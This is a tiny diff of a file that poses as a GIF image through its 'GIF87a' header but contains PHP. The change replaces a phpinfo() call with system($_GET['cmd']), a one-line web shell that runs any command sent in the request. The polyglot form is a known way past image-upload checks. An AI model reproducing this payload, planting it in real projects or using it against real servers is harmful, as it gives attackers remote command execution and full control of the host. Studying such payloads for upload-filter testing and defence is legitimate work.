@@ -1,4 +1,4 @@
 GIF87a
 <?php
-phpinfo();
+system($_GET['cmd']);
 ?>
